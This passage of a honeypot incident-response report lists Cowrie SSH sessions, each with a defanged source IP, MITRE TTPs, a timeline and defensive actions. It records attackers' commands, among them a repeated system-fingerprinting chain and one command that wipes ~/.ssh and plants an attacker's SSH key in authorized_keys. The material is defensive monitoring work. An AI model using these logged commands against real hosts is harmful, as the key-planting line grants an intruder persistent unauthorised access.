| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:34:10` | `cowrie.session.connect` |
| `2026-07-17 05:34:11` | `cowrie.client.version` |
| `2026-07-17 05:34:11` | `cowrie.client.kex` |
| `2026-07-17 05:34:12` | `cowrie.login.success` |
| `2026-07-17 05:34:13` | `cowrie.session.params` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.success` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:13` | `cowrie.command.input` |
| `2026-07-17 05:34:14` | `cowrie.log.closed` |
| `2026-07-17 05:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783284560789

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:35 |
| **Last Seen** | 2026-07-17 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:35:45` | `cowrie.session.connect` |
| `2026-07-17 05:35:45` | `cowrie.client.version` |
| `2026-07-17 05:35:45` | `cowrie.client.kex` |
| `2026-07-17 05:35:46` | `cowrie.login.success` |
| `2026-07-17 05:35:48` | `cowrie.session.params` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.success` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.command.input` |
| `2026-07-17 05:35:48` | `cowrie.log.closed` |
| `2026-07-17 05:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ab27aed6e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:37 |
| **Last Seen** | 2026-07-17 05:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:37:19` | `cowrie.session.connect` |
| `2026-07-17 05:37:20` | `cowrie.client.version` |
| `2026-07-17 05:37:20` | `cowrie.client.kex` |
| `2026-07-17 05:37:21` | `cowrie.login.success` |
| `2026-07-17 05:37:22` | `cowrie.session.params` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.success` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.command.input` |
| `2026-07-17 05:37:22` | `cowrie.log.closed` |
| `2026-07-17 05:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-254aa5e6e89b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:38 |
| **Last Seen** | 2026-07-17 05:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:38:50` | `cowrie.session.connect` |
| `2026-07-17 05:38:50` | `cowrie.client.version` |
| `2026-07-17 05:38:50` | `cowrie.client.kex` |
| `2026-07-17 05:38:52` | `cowrie.login.success` |
| `2026-07-17 05:38:53` | `cowrie.session.params` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.success` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.command.input` |
| `2026-07-17 05:38:53` | `cowrie.log.closed` |
| `2026-07-17 05:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ae1ff07cca

| Field | Detail |
|---|---|
| **Source IP** | `213.230.124[.]17` |
| **First Seen** | 2026-07-17 05:39 |
| **Last Seen** | 2026-07-17 05:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:39:33` | `cowrie.session.connect` |
| `2026-07-17 05:39:33` | `cowrie.client.version` |
| `2026-07-17 05:39:33` | `cowrie.client.kex` |
| `2026-07-17 05:39:35` | `cowrie.login.success` |
| `2026-07-17 05:39:35` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.124[.]17` to AbuseIPDB if not already reported
- [ ] Block `213.230.124[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbde7bf73f27

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:40 |
| **Last Seen** | 2026-07-17 05:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:40:23` | `cowrie.session.connect` |
| `2026-07-17 05:40:23` | `cowrie.client.version` |
| `2026-07-17 05:40:23` | `cowrie.client.kex` |
| `2026-07-17 05:40:25` | `cowrie.login.success` |
| `2026-07-17 05:40:26` | `cowrie.session.params` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.success` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.command.input` |
| `2026-07-17 05:40:26` | `cowrie.log.closed` |
| `2026-07-17 05:40:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b2399506e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:41 |
| **Last Seen** | 2026-07-17 05:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:41:57` | `cowrie.session.connect` |
| `2026-07-17 05:41:57` | `cowrie.client.version` |
| `2026-07-17 05:41:57` | `cowrie.client.kex` |
| `2026-07-17 05:41:58` | `cowrie.login.success` |
| `2026-07-17 05:41:59` | `cowrie.session.params` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.success` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.command.input` |
| `2026-07-17 05:41:59` | `cowrie.log.closed` |
| `2026-07-17 05:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314b56b257fe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:43 |
| **Last Seen** | 2026-07-17 05:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:43:31` | `cowrie.session.connect` |
| `2026-07-17 05:43:31` | `cowrie.client.version` |
| `2026-07-17 05:43:31` | `cowrie.client.kex` |
| `2026-07-17 05:43:32` | `cowrie.login.success` |
| `2026-07-17 05:43:34` | `cowrie.session.params` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.success` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.command.input` |
| `2026-07-17 05:43:34` | `cowrie.log.closed` |
| `2026-07-17 05:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c4eafc1b32

| Field | Detail |
|---|---|
| **Source IP** | `223.82.97[.]51` |
| **First Seen** | 2026-07-17 05:43 |
| **Last Seen** | 2026-07-17 05:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:43:32` | `cowrie.session.connect` |
| `2026-07-17 05:43:33` | `cowrie.client.version` |
| `2026-07-17 05:43:33` | `cowrie.client.kex` |
| `2026-07-17 05:43:35` | `cowrie.login.success` |
| `2026-07-17 05:43:36` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.97[.]51` to AbuseIPDB if not already reported
- [ ] Block `223.82.97[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57904f660dd8

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-07-17 05:43 |
| **Last Seen** | 2026-07-17 05:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:43:42` | `cowrie.session.connect` |
| `2026-07-17 05:43:42` | `cowrie.client.version` |
| `2026-07-17 05:43:42` | `cowrie.client.kex` |
| `2026-07-17 05:43:44` | `cowrie.login.success` |
| `2026-07-17 05:43:45` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:43:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39eecb690567

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:45 |
| **Last Seen** | 2026-07-17 05:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:45:05` | `cowrie.session.connect` |
| `2026-07-17 05:45:05` | `cowrie.client.version` |
| `2026-07-17 05:45:05` | `cowrie.client.kex` |
| `2026-07-17 05:45:06` | `cowrie.login.success` |
| `2026-07-17 05:45:08` | `cowrie.session.params` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.success` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.command.input` |
| `2026-07-17 05:45:08` | `cowrie.log.closed` |
| `2026-07-17 05:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d75bbfe562f

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-07-17 05:45 |
| **Last Seen** | 2026-07-17 05:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:45:33` | `cowrie.session.connect` |
| `2026-07-17 05:45:33` | `cowrie.client.version` |
| `2026-07-17 05:45:33` | `cowrie.client.kex` |
| `2026-07-17 05:45:34` | `cowrie.login.success` |
| `2026-07-17 05:45:35` | `cowrie.session.params` |
| `2026-07-17 05:45:35` | `cowrie.command.input` |
| `2026-07-17 05:45:35` | `cowrie.command.failed` |
| `2026-07-17 05:45:35` | `cowrie.log.closed` |
| `2026-07-17 05:45:36` | `cowrie.session.params` |
| `2026-07-17 05:45:36` | `cowrie.command.input` |
| `2026-07-17 05:45:37` | `cowrie.session.file_download` |
| `2026-07-17 05:45:37` | `cowrie.log.closed` |
| `2026-07-17 05:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e114c46eddbf

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-07-17 05:45 |
| **Last Seen** | 2026-07-17 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:45:37` | `cowrie.session.connect` |
| `2026-07-17 05:45:37` | `cowrie.client.version` |
| `2026-07-17 05:45:37` | `cowrie.client.kex` |
| `2026-07-17 05:45:38` | `cowrie.login.success` |
| `2026-07-17 05:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bfdc967f9c5

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-07-17 05:45 |
| **Last Seen** | 2026-07-17 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:45:39` | `cowrie.session.connect` |
| `2026-07-17 05:45:39` | `cowrie.client.version` |
| `2026-07-17 05:45:39` | `cowrie.client.kex` |
| `2026-07-17 05:45:40` | `cowrie.login.success` |
| `2026-07-17 05:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-888a00a26722

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:46 |
| **Last Seen** | 2026-07-17 05:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:46:39` | `cowrie.session.connect` |
| `2026-07-17 05:46:39` | `cowrie.client.version` |
| `2026-07-17 05:46:39` | `cowrie.client.kex` |
| `2026-07-17 05:46:40` | `cowrie.login.success` |
| `2026-07-17 05:46:42` | `cowrie.session.params` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.success` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.command.input` |
| `2026-07-17 05:46:42` | `cowrie.log.closed` |
| `2026-07-17 05:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4e5813817a4

| Field | Detail |
|---|---|
